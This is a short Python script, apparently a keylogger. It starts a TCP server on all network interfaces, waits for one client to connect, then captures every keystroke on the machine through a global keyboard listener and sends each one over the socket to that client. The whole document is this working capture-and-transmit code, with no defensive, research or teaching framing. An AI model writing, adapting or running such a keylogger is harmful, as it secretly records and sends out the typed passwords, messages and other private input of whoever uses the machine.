import socket
from pynput.keyboard import Listener

host = '0.0.0.0' # listen on all interfaces
port = 12345

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((host, port))
server_socket.listen(1)
print(f"TCP Server is listening on {host}:{port} for keyboard capture")

client_socket, client_address = server_socket.accept()
print(f"Connection established with {client_address}")

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            try:
                message = key.char.encode('utf-8')
                client_socket.send(message)
            except UnicodeEncodeError:
                print(f"Cannot send character: {key.char}")
        else:
            client_socket.send(str(key).encode('utf-8'))
    except Exception as e:
        print("Error:", e)

with Listener(on_press=on_press) as listener:
    listener.join()

client_socket.close()
server_socket.close()